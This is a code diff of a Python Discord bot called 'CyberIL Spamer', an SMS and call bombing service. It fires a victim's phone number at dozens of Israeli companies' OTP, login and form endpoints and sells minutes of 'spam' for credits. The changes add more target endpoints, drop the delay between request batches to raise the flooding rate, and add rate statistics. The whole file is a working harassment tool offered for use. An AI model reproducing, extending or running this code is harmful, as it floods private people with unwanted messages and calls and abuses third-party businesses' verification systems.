-                headers_extra=json_headers("https://www.getpackage.com", "https://www.getpackage.com/", {"sec-fetch-site": "same-site"}),
-                tag="getpackage"),
-            send_request(s, "POST", "https://ohmama.co.il/?wc-ajax=validate_user_by_sms",
-                form=f"otp_login_nonce=de90e8f67b&phone={raw}&security=de90e8f67b",
-                headers_extra={**form_headers("https://ohmama.co.il", "https://ohmama.co.il/"), "sec-fetch-site": "same-origin"},
-                tag="ohmama"),
-            send_request(s, "POST", "https://server.myofer.co.il/api/sendAuthSms",
-                json_data={"phoneNumber": raw},
-                headers_extra=json_headers("https://www.myofer.co.il", "https://www.myofer.co.il/", {"sec-fetch-site": "same-site", "x-app-version": "3.0.0"}),
-                tag="myofer"),
-            send_request(s, "POST", "https://arcaffe.co.il/wp-admin/admin-ajax.php",
-                form=f"action=user_login_step_1&phone_number={raw}&step[]=1",
-                headers_extra=form_headers("https://arcaffe.co.il", "https://arcaffe.co.il/"),
-                tag="arcaffe"),
-            send_request(s, "POST", "https://api.noyhasade.co.il/api/login?origin=web",
-                json_data={"phone": raw, "email": False, "ip": "1.1.1.1"},
-                headers_extra=json_headers("https://www.noyhasade.co.il", "https://www.noyhasade.co.il/", {"sec-fetch-site": "same-site"}),
-                tag="noyhasade"),
-            send_request(s, "POST", "https://api.geteat.co.il/auth/sendValidationCode",
-                data=geteat_fd,
-                headers_extra={"User-Agent": random_agent(), "accept-encoding": "gzip, deflate", "origin": "https://order.geteat.co.il", "referer": "https://order.geteat.co.il/", "sec-fetch-mode": "cors", "sec-fetch-site": "same-site"},
-                tag="geteat"),
+                json_data={"phoneNumber": formatted}, tag="dibs"),
+            
+            # ========== MISHLOHA (MULTIPLE ENDPOINTS) ==========
+            send_request(s, "https://webapi.mishloha.co.il/api/profile/sendSmsVerificationCodeByPhoneNumber?uuid=4c48ed0d-9622-4a1e-ac70-2821631b680b&apiKey=BA6A19D2-F5BD-4B75-A080-6BD1E2FBEF54&sessionID=24014c96-61ca-4cd6-87a9-9324aa2f3150&culture=he_IL&apiVersion=2",
+                json_data={"phoneNumber": raw, "isCalling": True}, tag="mishloha1"),
+            send_request(s, "https://webapi.mishloha.co.il/api/profile/sendSmsVerificationCodeByPhoneNumber",
+                json_data={"phoneNumber": raw, "sourceFrom": "AuthJS", "isCalling": True}, tag="mishloha2"),
+            send_request(s, "https://webapi.mishloha.co.il/api/profile/sendSmsVerificationCodeByPhoneNumber?culture=he&apiVersion=2",
+                json_data={"phoneNumber": raw, "sourceFrom": "desktopHomePage", "uuid": "c049beda-2a99-442c-afa9-db86ea140940", "apiKey": "BA6A19D2-F5BD-4B75-A080-6BD1E2FBEF54", "sessionID": sid[:36]}, tag="mishloha3"),
+            
+            # ========== FORMS & OTHER ==========
+            send_request(s, "https://we.care.co.il/wp-admin/admin-ajax.php",
+                data=f"post_id=351178&form_id=7079d8dd&queried_id=351178&form_fields[name]=CyberIL&form_fields[phone]={raw}&form_fields[email]={random_email}&form_fields[accept]=on&action=elementor_pro_forms_send_form", tag="wecare"),
+            send_request(s, "https://www.matara.pro/nedarimplus/V6/Files/WebServices/DebitBit.aspx?Action=CreateTransaction",
+                form=f"MosadId=7000297&ClientName=CyberIL&Phone={raw}&Amount=100&Tashlumim=1", tag="matara"),
+            send_request(s, "https://wissotzky-tlab.co.il/wp/wp-admin/admin-ajax.php",
+                form=f"action=otp_register&otp_phone={raw}&first_name=Cyber&last_name=IL&email={random_email}&date_birth=2000-11-11&approve_terms=true", tag="wissotzky"),
+            send_request(s, "https://clocklb.ok2go.co.il/api/v2/users/login",
+                json_data={"phone": raw}, tag="ok2go"),
+            send_request(s, "https://api-endpoints.histadrut.org.il/signup/send_code",
+                json_data={"phone": raw}, tag="histadrut"),
+            send_request(s, "https://www.papajohns.co.il/_a/aff_otp_auth",
+                form=f"phone={raw}", tag="papajohns"),
+            send_request(s, "https://www.iburgerim.co.il/_a/aff_otp_auth",
+                form=f"phone={raw}", tag="iburgerim"),
+            send_request(s, "https://www.americanlaser.co.il/wp-json/calc/v1/send-sms",
+                method="GET", tag="americanlaser"),
+            send_request(s, "https://wb0lovv2z8.execute-api.eu-west-1.amazonaws.com/prod/api/v1/getOrdersSiteData",
+                json_data={"id": sid, "domain": "5fc39fabffae5ac5a229cebb", "action": "generateOneTimer", "phoneNumber": raw}, tag="beecomm"),
+            send_request(s, "https://xtra.co.il/apps/api/inforu/sms",
+                json_data={"phoneNumber": raw}, tag="xtra"),
+            send_request(s, "https://api.getpackage.com/v1/graphql/",
+                json_data={"operationName": "sendCheckoutRegistrationCode", "variables": {"userName": raw}, "query": "mutation sendCheckoutRegistrationCode($userName: String!) { sendCheckoutRegistrationCode(userName: $userName) { status __typename } }"}, tag="getpackage"),
+            send_request(s, "https://ohmama.co.il/?wc-ajax=validate_user_by_sms",
+                form=f"otp_login_nonce=de90e8f67b&phone={raw}&security=de90e8f67b", tag="ohmama"),
+            send_request(s, "https://server.myofer.co.il/api/sendAuthSms",
+                json_data={"phoneNumber": raw}, tag="myofer"),
+            send_request(s, "https://arcaffe.co.il/wp-admin/admin-ajax.php",
+                form=f"action=user_login_step_1&phone_number={raw}&step[]=1", tag="arcaffe"),
+            send_request(s, "https://api.noyhasade.co.il/api/login?origin=web",
+                json_data={"phone": raw, "email": False, "ip": "1.1.1.1"}, tag="noyhasade"),
+            send_request(s, "https://www.zinger-organic.com/frontend/chkkksoepvnbnbb",
+                form=f"phone_number={raw}&_token=UvDFsX8fy3p35K3mVrXRCBJzrgjHWvYZAyMrnNnT&login_message_type=sms", tag="zinger"),
+            send_request(s, "https://www.jungle-club.co.il/wp-admin/admin-ajax.php",
+                form=f"action=simply-check-member-cellphone&cellphone={raw}", tag="jungleclub"),
+            send_request(s, "https://blendo.co.il/wp-admin/admin-ajax.php",
+                form=f"action=simply-check-member-cellphone&cellphone={raw}", tag="blendo"),
+            send_request(s, "https://api.gomobile.co.il/api/login",
+                json_data={"phone": raw}, tag="gomobile"),
+            send_request(s, "https://bonitademas.co.il/apps/imapi-customer",
+                json_data={"action": "login", "otpBy": "sms", "otpValue": raw}, tag="bonitademas"),
+            send_request(s, "https://story.magicetl.com/public/shopify/apps/otp-login/step-one",
+                json_data={"phone": raw}, tag="story"),
+            send_request(s, "https://authentication.wolt.com/v1/captcha/site_key_authenticated",
+                json_data={"phone_number": raw, "operation": "request_number_verification"}, tag="wolt-captcha"),
+            send_request(s, "https://www.golfkids.co.il/customer/ajax/post/",
+                form=f"form_key=XB0c9tAkTouRgHrI&bot_validation=1&type=login&telephone={raw}", tag="golfkids"),
+            send_request(s, "https://www.555.co.il/ms/rest/otpservice/client/send/phone",
+                json_data={"password": None, "phoneNr": raw, "sendType": 1, "systemType": None}, tag="555"),
+            send_request(s, "https://www.lehamim.co.il/_a/aff_otp_auth",
+                form=f"phone={raw}", tag="lehamim"),
+            send_request(s, "https://api.geteat.co.il/auth/sendValidationCode",
+                data=geteat_fd, tag="geteat"),
+            send_request(s, "https://www.ivory.co.il/user/login/sendCodeSms",
+                method="GET", tag="ivory"),
         ] + atmos_club
 
         all_res = await asyncio.gather(*tasks, return_exceptions=True)
@@ -798,22 +748,22 @@ async def run_spam_batch(phone: str):
 def create_panel():
     embed = discord.Embed(
         title="**CYBERIL SPAMER**",
-        description="המערכת המובילה בישראל",
+        description="המערכת המתקדמת בישראל | 100+ שירותים | ללא הגבלה",
         color=COLOR_MAIN
     )
     embed.add_field(
-        name="איך מתחילים?",
-        value="1. לחץ על התחל ספאם\n2. הזן מספר טלפון\n3. בחר כמות קרדיטים\n4. אשר והמתן",
+        name="🚀 התחל ספאם",
+        value="לחץ על הכפתור התחל ספאם\nהזן מספר טלפון ובחר כמות קרדיטים",
         inline=False
     )
     embed.add_field(
-        name="עלות",
-        value=f"כל קרדיט = דקה אחת של ספאם",
+        name="💎 עלות",
+        value=f"כל קרדיט = דקה אחת\nכל דקה = 100+ בקשות",
         inline=False
     )
     embed.add_field(
-        name="הערות",
-        value=f"דיליי של {COOLDOWN_TIME} שניות בין ספאם לאותו מספר",
+        name="⚡ מהירות",
+        value=f"שליחה במהירות הרשת המקסימלית\nדיליי של {COOLDOWN_TIME} שניות בין ספאם",
         inline=False
     )
     embed.set_footer(text=f"CyberIL Spamer © 2026")
@@ -826,7 +776,7 @@ def create_gift_panel():
         color=0xFFD700
     )
     embed.add_field(
-        name="איך מקבלים?",
+        name="🎁 איך מקבלים?",
         value="לחץ על הכפתור למטה",
         inline=False
     )
@@ -898,17 +848,18 @@ class ConfirmAttack(discord.ui.View):
                 success = await run_spam_batch(self.phone)
                 total_success += success
                 
-                if time.time() - last_update >= 5:
+                if time.time() - last_update >= 3:
                     remaining = max(0, int((end_time - time.time()) / 60))
+                    rate = int(total_success / max(1, time.time() - start_time))
                     embed = discord.Embed(
                         title="🔄 ספאם בתהליך",
-                        description=f"מספמם את **{self.phone}**\nנותר: ~{remaining} דקות\n\n✅ בקשות שנשלחו: {total_success}",
+                        description=f"מספמם את **{self.phone}**\nנותר: ~{remaining} דקות\n\n✅ בקשות: {total_success}\n⚡ קצב: {rate}/שנייה",
                         color=COLOR_WARNING
                     )
                     await interaction.edit_original_response(embed=embed, view=StopAttack(self.user_id))
                     last_update = time.time()
                 
-                await asyncio.sleep(0.1)
+                await asyncio.sleep(0)
 
             await apply_cooldown(self.phone)
             active_missions.pop(self.user_id, None)
@@ -932,9 +883,11 @@ class ConfirmAttack(discord.ui.View):
             else:
                 final = discord.Embed(title="✅ ספאם הושלם", color=COLOR_SUCCESS)
             
+            rate = int(total_success / max(1, self.cost * 60))
             final.add_field(name="📱 יעד", value=self.phone, inline=True)
             final.add_field(name="⏱️ משך", value=f"~{self.cost} דקות", inline=True)
             final.add_field(name="✅ בקשות", value=str(total_success), inline=True)
+            final.add_field(name="⚡ קצב", value=f"{rate}/שנייה", inline=True)
             final.add_field(name="💎 קרדיטים נותרים", value=bal, inline=True)
             
             await interaction.edit_original_response(embed=final, view=None)
@@ -954,13 +907,15 @@ class ConfirmAttack(discord.ui.View):
         await interaction.response.edit_message(embed=embed, view=None)
 
 class LaunchModal(discord.ui.Modal, title="התחל ספאם"):
-    phone = discord.ui.TextInput(label="מספר טלפון", placeholder="0501234567", min_length=10, max_length=10, style=discord.TextStyle.short)
+    phone = discord.ui.TextInput(label="מספר טלפון", placeholder="0501234567", min_length=9, max_length=10, style=discord.TextStyle.short)
     credits = discord.ui.TextInput(label="כמות קרדיטים", placeholder="1-100", min_length=1, max_length=3, style=discord.TextStyle.short)
 
     async def on_submit(self, interaction: discord.Interaction):
-        phone_num = self.phone.value.strip()
-        if not re.match(r"^(05[0-9]{8}|5[0-9]{8})$", phone_num):
-            embed = discord.Embed(title="❌ שגיאה", description="מספר לא תקין", color=COLOR_DANGER)
+        phone_num = self.phone.value.strip().replace("-", "").replace(" ", "")
+        if len(phone_num) == 9:
+            phone_num = "0" + phone_num
+        if not re.match(r"^05[0-9]{8}$", phone_num):
+            embed = discord.Embed(title="❌ שגיאה", description="מספר לא תקין (05XXXXXXXX)", color=COLOR_DANGER)
             await interaction.response.send_message(embed=embed, ephemeral=True)
             return
 
@@ -969,7 +924,7 @@ class LaunchModal(discord.ui.Modal, title="התחל ספאם"):
             if credits_num < 1 or credits_num > MAX_CREDIT_SPEND:
                 raise ValueError
         except ValueError:
-            embed = discord.Embed(title="❌ שגיאה", description="כמות לא תקינה", color=COLOR_DANGER)
+            embed = discord.Embed(title="❌ שגיאה", description=f"כמות לא תקינה (1-{MAX_CREDIT_SPEND})", color=COLOR_DANGER)
             await interaction.response.send_message(embed=embed, ephemeral=True)
             return
 
@@ -979,7 +934,7 @@ class LaunchModal(discord.ui.Modal, title="התחל ספאם"):
         unlimited = await has_unlimited(uid)
 
         if bal < credits_num and not unlimited:
-            embed = discord.Embed(title="❌ שגיאה", description="חסרים קרדיטים", color=COLOR_DANGER)
+            embed = discord.Embed(title="❌ שגיאה", description=f"חסרים קרדיטים (יש: {bal}, צריך: {credits_num})", color=COLOR_DANGER)
             await interaction.response.send_message(embed=embed, ephemeral=True)
             return
 
@@ -1168,7 +1123,7 @@ async def on_ready():
     client.add_view(MainPanel())
     client.add_view(FreeCoins())
     
-    await client.change_presence(activity=discord.Game(name="מערכת ספאם | CYBERIL"))
+    await client.change_presence(activity=discord.Game(name="🔥 CYBERIL SPAMER | 100+ SERVICES"))
     print(f"✅ CyberIL Spamer פעיל → {client.user}")
     print(f"📡 מחובר ל-{len(client.guilds)} שרתים")
 
@@ -1266,7 +1221,7 @@ async def cmd_removecredit(interaction: discord.Interaction, member: discord.Mem
     await interaction.response.send_message(embed=embed)
 
 @tree.command(name="lifetime", description="[ADMIN] הענק ללא הגבלה")
-@app_commands.describe(member="משתמש", duration="משך זמן (במספרים, השאר ריק לקבוע)", unit="יחידת זמן (minutes/hours/days/months/forever)")
+@app_commands.describe(member="משתמש", duration="משך זמן (השאר ריק לקבוע)", unit="יחידת זמן (minutes/hours/days/months/forever)")
 async def cmd_lifetime(interaction: discord.Interaction, member: discord.Member, duration: int = None, unit: str = "forever"):
     if not is_admin(interaction):
         await interaction.response.send_message("❌ אין הרשאות", ephemeral=True)
